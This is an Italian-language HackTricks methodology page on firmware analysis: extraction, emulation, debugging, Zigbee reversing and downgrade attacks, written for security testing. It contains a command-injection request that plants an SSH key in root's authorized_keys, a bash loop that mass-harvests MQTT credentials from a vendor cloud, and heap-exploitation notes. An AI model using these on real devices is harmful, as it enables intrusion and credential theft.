# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduzione**

### Risorse correlate


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Il firmware è un software essenziale che consente ai dispositivi di funzionare correttamente gestendo e facilitando la comunicazione tra i componenti hardware e il software con cui gli utenti interagiscono. È memorizzato in memoria permanente, garantendo che il dispositivo possa accedere a istruzioni vitali dal momento in cui viene acceso, portando all'avvio del sistema operativo. Esaminare e, potenzialmente, modificare il firmware è un passaggio critico per identificare vulnerabilità di sicurezza.

## **Raccolta di informazioni**

**La raccolta di informazioni** è un passaggio iniziale critico per comprendere la struttura di un dispositivo e le tecnologie che utilizza. Questo processo comporta la raccolta di dati su:

- L'architettura della CPU e il sistema operativo che esegue
- I dettagli del bootloader
- Il layout hardware e i datasheet
- Le metriche del codebase e le posizioni del source
- Librerie esterne e tipi di licenza
- Storici degli aggiornamenti e certificazioni normative
- Diagrammi architetturali e di flusso
- Valutazioni di sicurezza e vulnerabilità identificate

A questo scopo, gli strumenti di **open-source intelligence (OSINT)** sono preziosi, così come l'analisi di eventuali componenti software open-source disponibili tramite processi di revisione manuali e automatizzati. Strumenti come [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) offrono analisi statica gratuite che possono essere sfruttate per trovare potenziali problemi.

## **Acquisizione del Firmware**

Ottenere il firmware può essere affrontato in vari modi, ognuno con il proprio livello di complessità:

- **Direttamente** dalla source (developers, manufacturers)
- **Buildarlo** dalle istruzioni fornite
- **Scaricandolo** dai siti ufficiali di supporto
- Utilizzando query **Google dork** per trovare file firmware ospitati
- Accedendo direttamente allo **cloud storage**, con strumenti come [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercettando gli **update** tramite tecniche man-in-the-middle
- **Estrarre** dal dispositivo tramite connessioni come **UART**, **JTAG** o **PICit**
- **Sniffing** delle richieste di update all'interno della comunicazione del dispositivo
- Identificando e usando **hardcoded update endpoints**
- **Dumping** dal bootloader o dalla rete
- **Rimuovendo e leggendo** il chip di storage, quando tutto il resto fallisce, usando gli strumenti hardware appropriati

### Log solo UART: forzare una root shell tramite l'env di U-Boot nella flash

Se RX UART viene ignorato (solo log), puoi comunque forzare una init shell modificando offline il **blocco dell'environment di U-Boot**:

1. Dump della SPI flash con una clip SOIC-8 + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Individua la partizione dell'env di U-Boot, modifica `bootargs` per includere `init=/bin/sh`, e **ricalcola il CRC32 dell'env di U-Boot** per il blob.
3. Riscrivi solo la partizione dell'env e riavvia; una shell dovrebbe apparire su UART.

Questo è utile sui dispositivi embedded dove la shell del bootloader è disabilitata ma la partizione dell'env è scrivibile tramite accesso esterno alla flash.

## Analizzando il firmware

Ora che **hai il firmware**, devi estrarre informazioni su di esso per sapere come trattarlo. Diversi strumenti che puoi usare per questo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se non trovi molto con quei tool, controlla l'**entropy** dell'immagine con `binwalk -E <bin>`, se è bassa, allora probabilmente non è encrypted. Se è alta, è probabile che sia encrypted (o compressed in qualche modo).

Inoltre, puoi usare questi tool per estrarre **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oppure [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) per ispezionare il file.

### Getting the Filesystem

Con i tool commentati prima come `binwalk -ev <bin>` dovresti essere riuscito a **estrarre il filesystem**.\
Binwalk di solito lo estrae dentro una **cartella nominata come il tipo di filesystem**, che di solito è una delle seguenti: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

A volte, binwalk **non avrà il magic byte del filesystem nelle sue signatures**. In questi casi, usa binwalk per **trovare l'offset del filesystem e carve il filesystem compresso** dal binary e **estrarre manualmente** il filesystem in base al suo tipo usando i passaggi sotto.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Esegui il seguente **dd command** per estrarre il filesystem Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
In alternativa, è possibile eseguire anche il seguente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Per squashfs (usato nell'esempio sopra)

`$ unsquashfs dir.squashfs`

I file saranno poi nella directory "`squashfs-root`".

- File di archivio CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Per filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Per filesystem ubifs con NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analizzando il Firmware

Una volta ottenuto il firmware, è essenziale dissezionarlo per comprenderne la struttura e le possibili vulnerabilità. Questo processo prevede l'uso di vari strumenti per analizzare ed estrarre dati utili dall'immagine del firmware.

### Strumenti di Analisi Iniziale

Viene fornito un insieme di comandi per l'ispezione iniziale del file binario (indicato come `<bin>`). Questi comandi aiutano a identificare i tipi di file, estrarre strings, analizzare i dati binari e comprendere i dettagli di partizione e filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Per valutare lo stato di encryption dell'immagine, si controlla l'**entropy** con `binwalk -E <bin>`. Una bassa entropy suggerisce assenza di encryption, mentre un'elevata entropy indica possibile encryption o compression.

Per estrarre i **embedded files**, sono consigliati tool e risorse come la documentazione **file-data-carving-recovery-tools** e **binvis.io** per l'ispezione dei file.

### Extracting the Filesystem

Usando `binwalk -ev <bin>`, in genere si può estrarre il filesystem, spesso in una directory chiamata come il tipo di filesystem (ad es. squashfs, ubifs). Tuttavia, quando **binwalk** non riesce a riconoscere il tipo di filesystem a causa della mancanza dei magic bytes, è necessaria un'estrazione manuale. Questo comporta l'uso di `binwalk` per localizzare l'offset del filesystem, seguito dal comando `dd` per estrarre il filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Successivamente, a seconda del tipo di filesystem (ad esempio, squashfs, cpio, jffs2, ubifs), vengono usati comandi diversi per estrarne manualmente il contenuto.

### Analisi del filesystem

Una volta estratto il filesystem, inizia la ricerca di falle di sicurezza. L’attenzione è rivolta a network daemon non sicuri, credenziali hardcoded, API endpoints, funzionalità del server di update, codice non compilato, script di avvio e binari compilati per analisi offline.

**Posizioni chiave** e **elementi** da ispezionare includono:

- **etc/shadow** e **etc/passwd** per le credenziali utente
- certificati e chiavi SSL in **etc/ssl**
- file di configurazione e script per potenziali vulnerabilità
- binari embedded per ulteriori analisi
- web server e binari comuni dei dispositivi IoT

Diversi tool aiutano a individuare informazioni sensibili e vulnerabilità all’interno del filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) per la ricerca di informazioni sensibili
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) per un’analisi completa del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), e [**EMBA**](https://github.com/e-m-b-a/emba) per analisi statica e dinamica

### Controlli di sicurezza sui binari compilati

Sia il codice sorgente sia i binari compilati trovati nel filesystem devono essere esaminati per individuare vulnerabilità. Tool come **checksec.sh** per binari Unix e **PESecurity** per binari Windows aiutano a identificare binari non protetti che potrebbero essere sfruttati.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Molti IoT hub recuperano la configurazione per dispositivo da un endpoint cloud che ha un aspetto simile a:

- `https://<api-host>/pf/<deviceId>/<token>`

Durante l’analisi del firmware potresti scoprire che `<token>` è derivato localmente dal device ID usando un secret hardcoded, per esempio:

- token = MD5( deviceId || STATIC_KEY ) e rappresentato come uppercase hex

Questo design consente a chiunque conosca un deviceId e la STATIC_KEY di ricostruire l’URL e recuperare la cloud config, spesso rivelando credenziali MQTT in plaintext e topic prefix.

Workflow pratico:

1) Estrarre il deviceId dai UART boot logs

- Connetti un adapter UART a 3.3V (TX/RX/GND) e cattura i log:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Cerca le linee che stampano il pattern dell'URL di cloud config e l'indirizzo del broker, per esempio:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recupera STATIC_KEY e l'algoritmo del token dal firmware

- Carica i binari in Ghidra/radare2 e cerca il path di config ("/pf/") o l'uso di MD5.
- Conferma l'algoritmo (ad es. MD5(deviceId||STATIC_KEY)).
- Deriva il token in Bash e rendi il digest in uppercase:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Raccogli configurazione cloud e credenziali MQTT

- Componi l'URL e scarica il JSON con curl; analizza con jq per estrarre i secret:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusare di MQTT in chiaro e di ACL dei topic deboli (se presenti)

- Usa le credenziali recuperate per iscriverti ai topic di manutenzione e cercare eventi sensibili:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerare gli ID dispositivo prevedibili (su larga scala, con autorizzazione)

- Molti ecosistemi incorporano byte OUI/prodotto/tipo del vendor seguiti da un suffisso sequenziale.
- Puoi iterare gli ID candidati, derivare i token e recuperare le configurazioni in modo programmatico:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Ottenere sempre un'autorizzazione esplicita prima di tentare una enumerazione di massa.
- Preferire l'emulation o la static analysis per recuperare secrets senza modificare l'hardware target quando possibile.


Il processo di emulazione del firmware abilita **dynamic analysis** sia del funzionamento di un device sia di un singolo programma. Questo approccio può incontrare difficoltà con dipendenze hardware o di architettura, ma trasferire il root filesystem o specifici binaries su un device con architettura ed endianness corrispondenti, come un Raspberry Pi, o su una virtual machine pre-costruita, può facilitare ulteriori test.

### Emulating Individual Binaries

Per esaminare singoli programmi, identificare l'endianness del programma e l'architettura CPU è cruciale.

#### Example with MIPS Architecture

Per emulare un binary con architettura MIPS, si può usare il comando:
```bash
file ./squashfs-root/bin/busybox
```
E per installare i necessari strumenti di emulazione:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Per MIPS (big-endian), viene usato `qemu-mips`, mentre per i binari little-endian la scelta sarebbe `qemu-mipsel`.

#### ARM Architecture Emulation

Per i binari ARM, il processo è simile, con l'emulatore `qemu-arm` utilizzato per l'emulazione.

### Full System Emulation

Strumenti come [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), e altri, facilitano la full firmware emulation, automatizzando il processo e aiutando nell'analisi dinamica.

## Dynamic Analysis in Practice

A questo punto, viene usato per l'analisi un ambiente di dispositivo reale o emulato. È essenziale mantenere l'accesso shell all'OS e al filesystem. L'emulation potrebbe non mimare perfettamente le interazioni hardware, rendendo necessari occasionali riavvii dell'emulation. L'analisi dovrebbe riesaminare il filesystem, sfruttare le pagine web esposte e i servizi di rete, ed esplorare le vulnerabilità del bootloader. I firmware integrity tests sono critici per identificare potenziali backdoor vulnerabilities.

## Runtime Analysis Techniques

La runtime analysis consiste nell'interagire con un processo o binario nel suo ambiente operativo, usando strumenti come gdb-multiarch, Frida e Ghidra per impostare breakpoint e identificare vulnerabilità tramite fuzzing e altre tecniche.

Per target embedded senza un debugger completo, **copia un `gdbserver` staticamente linkato** sul dispositivo e collega in remoto:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mappatura dei messaggi Zigbee / radio co-processor

Sugli hub IoT lo stack RF è spesso diviso tra una **radio MCU** e un processo Linux userland. Un workflow utile è mappare il percorso:

1. **RF frame** nell’aria
2. **controller-side parser** sulla radio MCU
3. protocollo **serial/UART text or TLV** inoltrato a Linux (per esempio `/dev/tty*`)
4. **application dispatcher** nel main daemon
5. **protocol-specific handler / state machine**

Questa architettura crea due target di reversing invece di uno. Se il controller converte i frame radio binari in un protocollo testuale come `Group,Command,arg1,arg2,...`, recupera:

- I **message groups** e le tabelle di dispatch
- Quali messaggi possono arrivare dalla **network** rispetto al controller stesso
- Gli esatti campi discriminatori **manufacturer-specific** (per esempio Zigbee `manufacturer_code` e `cluster_command` custom)
- Quali handler sono raggiungibili solo durante **commissioning**, discovery o le fasi di firmware/model download

Per Zigbee in particolare, cattura il traffico di pairing e verifica se il target si basa ancora sul **Link Key** predefinito `ZigBeeAlliance09`. Se sì, lo sniffing del traffico di commissioning può esporre il **Network Key**. Gli install code di Zigbee 3.0 riducono questa esposizione, quindi nota se il dispositivo testato li impone davvero.

### Handler di protocollo manufacturer-specific e reachability gated da FSM

I comandi Zigbee/ZCL vendor-specific sono spesso un target migliore dei cluster standardizzati perché alimentano **custom parsing code** e **FSM** interne con validazione meno collaudata.

Workflow pratico:

- Fai reversing del command dispatcher finché trovi l’**vendor-only handler**.
- Recupera le tabelle di stato della **FSM**, **event**, **check**, **action** e **next-state**.
- Identifica gli **stati transizionali** che avanzano automaticamente e i branch di retry/error che alla fine resettano o liberano stato controllato dall’attaccante.
- Conferma quali scambi di protocollo legittimi sono necessari per portare il daemon nello stato vulnerabile, invece di assumere che l’handler bugged sia sempre raggiungibile.

Per protocolli sensibili al timing, il replay dei pacchetti da un framework Python potrebbe essere troppo lento. Un approccio più affidabile è emulare un dispositivo legittimo su hardware reale (per esempio un **nRF52840**) con uno stack di livello vendor, così da esporre i corretti **endpoints**, **attributes** e il timing di commissioning.

### Classe di bug da fragmented-download nei daemon embedded

Una classe ricorrente di bug firmware appare nei **fragmented blob/model/configuration downloads**:

1. Il **first fragment** (`offset == 0`) salva `ctx->total_size` e alloca `malloc(total_size)`.
2. I fragment successivi validano solo i campi **packet-local** controllati dall’attaccante, come `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` senza controllare la **original allocated size**.

Questo consente a un attaccante di inviare:

- Un primo fragment valido con una declared total size **piccola** per forzare una piccola heap allocation.
- Un fragment successivo con l’**expected offset** ma un `chunk_len` più grande.
- Un forged packet-local size che soddisfa i controlli appena fatti ma overflowa comunque il buffer allocato originariamente.

Quando il percorso vulnerabile è dietro logica di commissioning, lo sfruttamento deve includere abbastanza **device emulation** da portare il target nello stato atteso di model-download o blob-download prima di inviare i fragment malformati.

### Trigger `free()` guidati dal protocollo

Nei daemon embedded, il modo più semplice per triggerare heap metadata exploitation spesso non è "aspettare la cleanup" ma **forzare il protocol’s own error handling**:

- Invia fragment successivi malformati per spingere la FSM negli stati di **retry** o **error**.
- Supera la soglia di retry così che il daemon **reset context** e liberi il buffer corrotto.
- Usa questo `free()` prevedibile per triggerare primitive lato allocator prima che il processo crashi per ragioni non correlate.

Questo è particolarmente utile contro allocator **musl/uClibc/dlmalloc-like** in embedded Linux, dove corrompere i chunk metadata può trasformare la logica unlink/unbin in una write primitive. Un pattern stabile è corrompere un **size field** per reindirizzare la traversal dell’allocator verso **fake chunks staged inside the overflowed buffer**, invece di sovrascrivere subito i puntatori reali dei bin e far crashare il processo.

## Binary Exploitation and Proof-of-Concept

Sviluppare una PoC per vulnerabilità identificate richiede una profonda comprensione dell’architettura target e programmazione in linguaggi di basso livello. Le protezioni runtime binarie nei sistemi embedded sono rare, ma quando presenti potrebbero essere necessarie tecniche come Return Oriented Programming (ROP).

### Note di exploitation uClibc fastbin (embedded Linux)

- **Fastbins + consolidation:** uClibc usa fastbins simili a glibc. Una successiva allocazione grande può triggerare `__malloc_consolidate()`, quindi ogni fake chunk deve superare i controlli (size plausibile, `fd = 0`, e chunk circostanti visti come "in use").
- **Binary non-PIE sotto ASLR:** se ASLR è abilitato ma il main binary è **non-PIE**, gli indirizzi `.data/.bss` nel binario sono stabili. Puoi puntare a una regione che assomiglia già a un header di heap chunk valido per far atterrare un’allocazione fastbin su una **function pointer table**.
- **Parser-stopping NUL:** quando viene parsato JSON, un `\x00` nel payload può fermare il parsing mantenendo però i byte finali controllati dall’attaccante per uno stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** una ROP chain che chiama `open("/proc/self/mem")`, `lseek()` e `write()` può piazzare shellcode eseguibile in una mapping nota e saltarci.

## Prepared Operating Systems for Firmware Analysis

Operating systems come [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) forniscono ambienti preconfigurati per firmware security testing, dotati degli strumenti necessari.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS è una distro pensata per aiutarti a fare security assessment e penetration testing di dispositivi Internet of Things (IoT). Ti fa risparmiare molto tempo fornendo un ambiente preconfigurato con tutti gli strumenti necessari già caricati.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo per embedded security testing basato su Ubuntu 18.04, preinstallato con strumenti per firmware security testing.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Anche quando un vendor implementa controlli di firma crittografica per le immagini firmware, la **version rollback (downgrade) protection** viene spesso omessa. Quando il boot- o recovery-loader verifica solo la firma con una chiave pubblica incorporata ma non confronta la *version* (o un contatore monotono) dell’immagine in flash, un attaccante può installare legittimamente un **older, vulnerable firmware che mantiene una valid signature** e reintrodurre vulnerabilità già patchate.

Workflow tipico dell’attacco:

1. **Obtain an older signed image**
* Recuperala dal portale pubblico di download del vendor, dalla CDN o dal sito di supporto.
* Estraila da companion mobile/desktop applications (per esempio dentro un Android APK in `assets/firmware/`).
* Recuperala da repository di terze parti come VirusTotal, archivi Internet, forum, ecc.
2. **Upload or serve the image to the device** tramite qualsiasi canale di update esposto:
* Web UI, mobile-app API, USB, TFTP, MQTT, ecc.
* Molti dispositivi IoT consumer espongono endpoint HTTP(S) *unauthenticated* che accettano blob firmware codificati in Base64, li decodificano lato server e triggerano recovery/upgrade.
3. Dopo il downgrade, sfrutta una vulnerabilità che era stata patchata nella release più recente (per esempio un filtro per command-injection aggiunto dopo).
4. Opzionalmente riflasha l’ultima immagine o disabilita gli update per evitare il rilevamento una volta ottenuta la persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Nel firmware vulnerabile (degradato), il parametro `md5` viene concatenato direttamente in un comando shell senza sanitizzazione, consentendo l'injection di comandi arbitrari (qui – abilitando l'accesso root via SSH basato su chiave). Le versioni successive del firmware hanno introdotto un filtro base sui caratteri, ma l'assenza di protezione dal downgrade rende la correzione inutile.

### Extracting Firmware From Mobile Apps

Molti vendor includono immagini firmware complete all'interno delle loro app mobile companion, così che l'app possa aggiornare il device via Bluetooth/Wi-Fi. Questi pacchetti sono comunemente archiviati non criptati nell'APK/APEX sotto path come `assets/fw/` o `res/raw/`. Tool come `apktool`, `ghidra`, o anche il semplice `unzip` consentono di estrarre immagini firmate senza toccare l'hardware fisico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass anti-rollback solo updater in design A/B slot

Alcuni vendor implementano un **ratchet** anti-downgrade, ma solo nella logica dell'*updater* (per esempio una routine UDS su CAN, un comando recovery, o un agent OTA in userspace). Se il **bootloader** in seguito controlla solo la signature/CRC dell’immagine e si fida della partition table o dei metadati dello slot, la rollback protection può comunque essere bypassata.

Design debole tipico:

- I metadati del firmware contengono sia un descrittore di versione sia un **security ratchet** / monotonic counter.
- L’updater confronta il ratchet dell’immagine con un valore memorizzato in persistent storage e rifiuta immagini firmate più vecchie.
- Il bootloader non analizza quel ratchet e verifica solo header, CRC e signature prima di avviare lo slot selezionato.
- L’attivazione dello slot è memorizzata separatamente in una partition table o in un contatore di generazione per-slot e **non è legata crittograficamente** al digest esatto del firmware che è stato validato.

Questo crea un primitivo **validate-one-image / boot-another-image** nei sistemi dual-slot. Se l’attaccante può far segnare allo updater lo slot B come prossimo target di boot usando un’immagine firmata attuale, e poi può sovrascrivere lo slot B prima del reboot, il bootloader può comunque avviare l’immagine downgraded perché si fida solo dei metadati dello slot già confermati.

Schema di abuso tipico:

1. Carica un firmware **firmato attuale** nello slot passivo ed esegui la normale routine di validazione/switch in modo che il layout segni quello slot come prossimo attivo.
2. **Non riavviare ancora**. Rientra nella routine di preparazione/erase dello slot nella stessa sessione.
3. Abusa di stato di boot obsoleto o di logica di selezione slot obsoleta in modo che l’updater cancelli lo **stesso slot fisico** appena promosso.
4. Scrivi in quello slot un firmware **più vecchio ma ancora firmato**.
5. Salta la routine di validazione che impone il ratchet e riavvia direttamente.
6. Il bootloader seleziona lo slot promosso, verifica solo signature/integrity e avvia l’immagine vecchia.

Cose da cercare quando fai reverse di implementazioni di update A/B:

- Selezione dello slot derivata da **boot-time flags** che non vengono aggiornati dopo uno switch riuscito.
- Una routine tipo `prepare_passive_slot()` che cancella uno slot basandosi su stato obsoleto invece che sul **current committed layout**.
- Una funzione tipo `part_write_layout()` che incrementa solo un **generation counter** / active flag e non salva l’hash dell’immagine validata.
- Controlli del ratchet implementati in userspace o nel codice dell’updater, ma **non** in ROM / bootloader / secure boot stages.
- Routine di erase o recovery che lasciano lo slot marcato come bootable anche dopo che il suo contenuto è stato rimosso e riscritto.

### Checklist per valutare la logica di update

* Il transport/authentication dell’*update endpoint* è adeguatamente protetto (TLS + authentication)?
* Il device confronta i **numeri di versione** o un **monotonic anti-rollback counter** prima del flashing?
* L’immagine viene verificata dentro una secure boot chain (per esempio signature controllate da codice ROM)?
* Il **bootloader** applica lo stesso ratchet dell’updater, invece di controllare solo signature/CRC?
* I metadati di attivazione dello slot sono **legati al digest/version del firmware validato**, oppure uno slot può essere modificato dopo la promozione?
* Dopo che uno switch di slot ha successo, il device è forzato a reboot oppure routine di update/erase successive sono ancora raggiungibili nella stessa sessione?
* Il codice userland esegue controlli di sanità aggiuntivi (per esempio allowed partition map, model number)?
* I flussi di update *partial* o *backup* riusano la stessa logica di validazione?

> 💡  Se manca anche solo uno dei punti sopra, la piattaforma è probabilmente vulnerabile a rollback attacks.

## Firmware vulnerabili su cui fare pratica

Per esercitarti nella scoperta di vulnerabilità nel firmware, usa i seguenti progetti di firmware vulnerabile come punto di partenza.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
